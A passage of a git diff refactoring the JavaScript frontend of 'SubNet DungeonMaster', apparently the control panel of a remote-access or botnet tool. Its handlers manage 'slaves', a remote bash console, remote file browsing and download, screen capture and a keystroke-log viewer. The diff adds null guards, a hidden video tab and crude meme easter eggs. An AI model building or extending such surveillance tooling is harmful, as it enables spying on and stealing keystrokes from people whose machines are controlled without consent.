         e.stopPropagation(); callPython('on_item_remove', full, !!entry.folder);
       });
-      el.querySelector('[data-act="rename"]').addEventListener('click', (e) => {
+      on(el.querySelector('[data-act="rename"]'), 'click', (e) => {
         e.stopPropagation();
         const next = prompt('Rename to', entry.name);
         if (!next || next === entry.name) return;
         callPython('on_rename', full, joinPath(explorerPath, next));
       });
-
-      el.addEventListener('dragstart', (e) => {
+      on(el, 'dragstart', (e) => {
         e.dataTransfer.setData('application/x-explorer-path', full);
         e.dataTransfer.setData('application/x-explorer-folder', entry.folder ? '1' : '0');
         e.dataTransfer.effectAllowed = 'move';
         el.classList.add('dragging');
       });
-      el.addEventListener('dragend', () => el.classList.remove('dragging'));
-
+      on(el, 'dragend', () => el.classList.remove('dragging'));
       if (entry.folder) {
-        el.addEventListener('dragover', (e) => {
+        on(el, 'dragover', (e) => {
           if (!e.dataTransfer.types.includes('application/x-explorer-path')) return;
-          e.preventDefault();
-          e.stopPropagation();
+          e.preventDefault(); e.stopPropagation();
           el.classList.add('drop-target');
         });
-        el.addEventListener('dragleave', () => el.classList.remove('drop-target'));
-        el.addEventListener('drop', (e) => {
+        on(el, 'dragleave', () => el.classList.remove('drop-target'));
+        on(el, 'drop', (e) => {
           el.classList.remove('drop-target');
           const src = e.dataTransfer.getData('application/x-explorer-path');
           if (!src || src === full) return;
-          e.preventDefault();
-          e.stopPropagation();
+          e.preventDefault(); e.stopPropagation();
           const baseName = src.split('/').filter(Boolean).pop();
-          const dest = joinPath(full, baseName);
-          callPython('on_move', src, dest);
+          callPython('on_move', src, joinPath(full, baseName));
         });
       }
-
       explorerTree.appendChild(el);
     });
   }
 
   function setExplorerFile(path, content, isImage) {
     explorerOpenPath = path;
-    explorerFileName.textContent = path || '—';
-    btnExplorerSave.hidden = false; btnExplorerClose.hidden = false; explorerViewerEmpty.hidden = true;
+    if (explorerFileName) explorerFileName.textContent = path || '—';
+    if (btnExplorerSave) btnExplorerSave.hidden = false;
+    if (btnExplorerClose) btnExplorerClose.hidden = false;
+    if (explorerViewerEmpty) explorerViewerEmpty.hidden = true;
     if (btnExplorerDownload) btnExplorerDownload.hidden = false;
     const image = isImage === true || (isImage == null && isImageName(path));
     if (image) {
-      explorerEditorWrap.hidden = true; explorerImageWrap.hidden = false; btnExplorerSave.hidden = true;
+      if (explorerEditorWrap) explorerEditorWrap.hidden = true;
+      if (explorerImageWrap) explorerImageWrap.hidden = false;
+      if (btnExplorerSave) btnExplorerSave.hidden = true;
       let src = content || '';
-      if (src && !src.startsWith('data:') && !src.startsWith('http')) src = 'data:image/png;base64,' + String(src).replace(/\s+/g, '');
-      explorerImage.src = src;
+      if (src && !src.startsWith('data:') && !src.startsWith('http')) {
+        src = 'data:image/png;base64,' + String(src).replace(/\s+/g, '');
+      }
+      if (explorerImage) explorerImage.src = src;
     } else {
-      explorerImageWrap.hidden = true; explorerEditorWrap.hidden = false;
+      if (explorerImageWrap) explorerImageWrap.hidden = true;
+      if (explorerEditorWrap) explorerEditorWrap.hidden = false;
       initCodeMirror();
       const text = content == null ? '' : String(content);
-      if (cmEditor) { cmEditor.setValue(text); cmEditor.setOption('mode', guessMode(path)); setTimeout(() => cmEditor.refresh(), 30); }
-      else explorerEditor.value = text;
+      if (cmEditor) {
+        cmEditor.setValue(text);
+        cmEditor.setOption('mode', guessMode(path));
+        setTimeout(() => cmEditor.refresh(), 30);
+      } else if (explorerEditor) explorerEditor.value = text;
     }
     renderExplorerTree();
   }
 
   function closeExplorerViewer() {
-    explorerOpenPath = null; explorerFileName.textContent = '—';
-    btnExplorerSave.hidden = true; btnExplorerClose.hidden = true;
+    explorerOpenPath = null;
+    if (explorerFileName) explorerFileName.textContent = '—';
+    if (btnExplorerSave) btnExplorerSave.hidden = true;
+    if (btnExplorerClose) btnExplorerClose.hidden = true;
     if (btnExplorerDownload) btnExplorerDownload.hidden = true;
-    explorerImageWrap.hidden = true; explorerEditorWrap.hidden = true; explorerViewerEmpty.hidden = false;
-    explorerImage.removeAttribute('src');
+    if (explorerImageWrap) explorerImageWrap.hidden = true;
+    if (explorerEditorWrap) explorerEditorWrap.hidden = true;
+    if (explorerViewerEmpty) explorerViewerEmpty.hidden = false;
+    if (explorerImage) explorerImage.removeAttribute('src');
     if (cmEditor) cmEditor.setValue('');
     renderExplorerTree();
   }
 
-  $('#btn-explorer-up').addEventListener('click', () => callPython('on_open_folder', parentPath(explorerPath)));
-  $('#btn-explorer-new-file').addEventListener('click', () => {
+  on($('#btn-explorer-up'), 'click', () => callPython('on_open_folder', parentPath(explorerPath)));
+  on($('#btn-explorer-new-file'), 'click', () => {
     const name = prompt('File name'); if (!name) return;
     callPython('on_create_item', joinPath(explorerPath, name), false);
   });
-  $('#btn-explorer-new-folder').addEventListener('click', () => {
+  on($('#btn-explorer-new-folder'), 'click', () => {
     const name = prompt('Folder name'); if (!name) return;
     callPython('on_create_item', joinPath(explorerPath, name), true);
   });
-  $('#btn-explorer-refresh').addEventListener('click', () => callPython('on_open_folder', explorerPath));
-  btnExplorerSave.addEventListener('click', () => {
+  on($('#btn-explorer-refresh'), 'click', () => callPython('on_open_folder', explorerPath));
+  on(btnExplorerSave, 'click', () => {
     if (!explorerOpenPath) return;
-    callPython('on_save_file', explorerOpenPath, cmEditor ? cmEditor.getValue() : explorerEditor.value);
+    callPython('on_save_file', explorerOpenPath, cmEditor ? cmEditor.getValue() : (explorerEditor && explorerEditor.value));
   });
-  if (btnExplorerDownload) {
-    btnExplorerDownload.addEventListener('click', () => {
-      if (!explorerOpenPath) return;
-      callPython('on_file_download', explorerOpenPath);
-    });
-  }
-  btnExplorerClose.addEventListener('click', closeExplorerViewer);
+  on(btnExplorerDownload, 'click', () => {
+    if (!explorerOpenPath) return;
+    callPython('on_file_download', explorerOpenPath);
+  });
+  on(btnExplorerClose, 'click', closeExplorerViewer);
 
-  // KEY LOG
+  // KEYLOG
   function setKeyLog(entries) {
     keylogEntries = Array.isArray(entries) ? entries.slice() : [];
-    keylogSelected.clear(); btnKeylogSave.disabled = true;
+    keylogSelected.clear();
+    if (btnKeylogSave) btnKeylogSave.disabled = true;
     renderKeyLog();
   }
 
   function renderKeyLog() {
+    if (!keylogList) return;
     keylogList.innerHTML = '';
-    keylogEmpty.classList.toggle('visible', !keylogEntries.length);
-    keylogMeta.textContent = keylogEntries.length ? String(keylogEntries.length) : '—';
+    if (keylogEmpty) keylogEmpty.classList.toggle('visible', !keylogEntries.length);
+    if (keylogMeta) keylogMeta.textContent = keylogEntries.length ? String(keylogEntries.length) : '—';
     if (!keylogEntries.length) return;
     const groups = {};
     keylogEntries.forEach((e, idx) => {
@@ -869,57 +980,95 @@
           if (keylogSelected.has(idx)) keylogSelected.delete(idx); else keylogSelected.add(idx);
           row.classList.toggle('selected', keylogSelected.has(idx));
           cb.checked = keylogSelected.has(idx);
-          btnKeylogSave.disabled = keylogSelected.size === 0;
+          if (btnKeylogSave) btnKeylogSave.disabled = keylogSelected.size === 0;
         };
-        row.addEventListener('click', (ev) => { if (ev.target !== cb) toggle(); });
-        cb.addEventListener('change', toggle);
+        on(row, 'click', (ev) => { if (ev.target !== cb) toggle(); });
+        on(cb, 'change', toggle);
         keylogList.appendChild(row);
       });
     });
   }
 
-  btnKeylogApply.addEventListener('click', () => {
-    callPython('onKeyLogTimeRangeSet', keylogFrom.value || null, keylogTo.value || null);
+  on(btnKeylogApply, 'click', () => {
+    callPython('onKeyLogTimeRangeSet', (keylogFrom && keylogFrom.value) || null, (keylogTo && keylogTo.value) || null);
   });
-  btnKeylogSave.addEventListener('click', () => {
+  on(btnKeylogSave, 'click', () => {
     const keys = [...keylogSelected].sort((a, b) => a - b).map((i) => keylogEntries[i]);
     callPython('onKeyLogSave', keys);
   });
 
-  // ─── HOTKEYS ───────────────────────────────────────────────
+  // dungeon UI
+  on($('#btn-dungeon-hide'), 'click', () => {
+    sealDungeonTab();
+    sendAnnounce('Dungeon sealed', 'info');
+  });
+  on($('#btn-dungeon-stop'), 'click', stopDungeonVideo);
+  on($('#btn-dungeon-try-embed'), 'click', tryDungeonEmbed);
+  on($('#btn-dungeon-external'), 'click', () => openExternalVideo());
+  $$('.dungeon-toolbar [data-yt]').forEach((btn) => {
+    on(btn, 'click', () => playDungeonVideo(btn.dataset.yt));
+  });
+
+  // hotkeys
   document.addEventListener('keydown', (e) => {
-    // Esc always works
     if (e.key === 'Escape') {
-      if (drawer.classList.contains('open')) { closeDrawer(); e.preventDefault(); return; }
+      if (drawer && drawer.classList.contains('open')) { closeDrawer(); e.preventDefault(); return; }
       if (explorerOpenPath) { closeExplorerViewer(); e.preventDefault(); return; }
       return;
     }
-
-    // Ctrl+L → bash focus
     if ((e.ctrlKey || e.metaKey) && (e.key === 'l' || e.key === 'L')) {
-      if (!app.hidden) {
+      if (app && !app.hidden) {
         e.preventDefault();
         switchPage('bash');
-        setTimeout(() => bashInput.focus(), 30);
+        setTimeout(() => bashInput && bashInput.focus(), 30);
       }
       return;
     }
-
     if (isTypingTarget(e.target)) return;
-    if (app.hidden) return;
+    if (app && app.hidden) return;
     if (e.ctrlKey || e.metaKey || e.altKey) return;
-
     const k = e.key;
-    if (k >= '1' && k <= '6') {
+    if (k >= '1' && k <= '5') {
       const page = PAGE_ORDER[Number(k) - 1];
       if (page) { switchPage(page); e.preventDefault(); }
       return;
     }
+    if (k === '6' && dungeonUnlocked) { switchPage('dungeon'); e.preventDefault(); return; }
     if (k === 's' || k === 'S') { toggleDrawer(); e.preventDefault(); return; }
     if (k === 'r' || k === 'R') { doReconnect(); e.preventDefault(); return; }
   });
 
-  // ─── EXPOSE ────────────────────────────────────────────────
+  // konami
+  const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
+  let kIdx = 0;
+  document.addEventListener('keydown', (e) => {
+    if (e.keyCode === konami[kIdx]) {
+      kIdx++;
+      if (kIdx === konami.length) {
+        kIdx = 0;
+        document.body.classList.toggle('gachi-mode');
+        sendAnnounce(document.body.classList.contains('gachi-mode') ? '♂ Dungeon rank: GYMPROOF' : 'Returned to civilian form', 'success');
+      }
+    } else {
+      kIdx = e.keyCode === konami[0] ? 1 : 0;
+    }
+  });
+
+  const logoMark = $('#logo-mark') || $('.logo-mark');
+  let logoClicks = 0, logoTimer = null;
+  if (logoMark) {
+    logoMark.style.cursor = 'pointer';
+    on(logoMark, 'click', () => {
+      logoClicks++;
+      clearTimeout(logoTimer);
+      logoTimer = setTimeout(() => { logoClicks = 0; }, 2000);
+      if (logoClicks >= 7) {
+        logoClicks = 0;
+        sendAnnounce(GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)], 'success');
+      }
+    });
+  }
+
   window.setAuthenticated = setAuthenticated;
   window.setMaximized = setMaximized;
   window.sendAnnounce = sendAnnounce;
@@ -938,75 +1087,9 @@
   window.DM = {
     setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo, setScreen,
     appendBash, clearBash, setLoginError, openSlave, closeSlave, switchPage,
-    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog
+    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog,
+    unlockDungeonTab, sealDungeonTab
   };
-
-  // ─── GACHI EASTER EGGS (frontend only) ─────────────────────
-  const GACHI_QUOTES = [
-    'Ass we can', 'Thank you sir', '300 bucks', 'Boss of this gym',
-    'Deep dark fantasies', 'It is so deep', 'I am an artist', 'Fisting is 300 bucks',
-  ];
-  function gachiToast(msg) { sendAnnounce(msg, 'success'); }
-
-  const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
-  let kIdx = 0;
-  document.addEventListener('keydown', (e) => {
-    if (e.keyCode === konami[kIdx]) {
-      kIdx++;
-      if (kIdx === konami.length) {
-        kIdx = 0;
-        document.body.classList.toggle('gachi-mode');
-        gachiToast(document.body.classList.contains('gachi-mode') ? '♂ Dungeon rank: GYMPROOF' : 'Returned to civilian form');
-      }
-    } else {
-      kIdx = e.keyCode === konami[0] ? 1 : 0;
-    }
-  });
-
-  const logoMark = document.getElementById('logo-mark') || $('.logo-mark');
-  let logoClicks = 0, logoTimer = null;
-  if (logoMark) {
-    logoMark.style.cursor = 'pointer';
-    logoMark.addEventListener('click', () => {
-      logoClicks++;
-      clearTimeout(logoTimer);
-      logoTimer = setTimeout(() => { logoClicks = 0; }, 2000);
-      if (logoClicks >= 7) {
-        logoClicks = 0;
-        gachiToast(GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]);
-      }
-    });
-  }
-
-  const BASH_SECRETS = {
-    'boss of this gym': 'You are now boss of this gym',
-    'ass we can': 'YES WE CAN',
-    'thank you sir': 'You are welcome, master',
-    '300 bucks': 'Invoice sent to the dungeon',
-    'gachi': null,
-    'lotion': 'Application requires elevated privileges',
-  };
-  bashInput.addEventListener('keydown', (e) => {
-    if (e.key !== 'Enter') return;
-    const raw = bashInput.value.trim();
-    const cmd = raw.toLowerCase();
-    if (!(cmd in BASH_SECRETS)) return;
-    e.stopImmediatePropagation();
-    e.preventDefault();
-    const msg = BASH_SECRETS[cmd] === null
-      ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
-      : BASH_SECRETS[cmd];
-    appendBash(raw, 'cmd');
-    pushBashHistory(raw);
-    bashHistoryIdx = -1;
-    bashInput.value = '';
-    appendBash(msg, 'sys');
-    gachiToast(msg);
-  }, true);
-
-  try {
-    console.log('%c♂ SubNet DungeonMaster', 'color:#c9a227;font-size:14px;font-family:monospace');
-  } catch (_) {}
 
   updateNoSlaveHint();
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initCodeMirror);
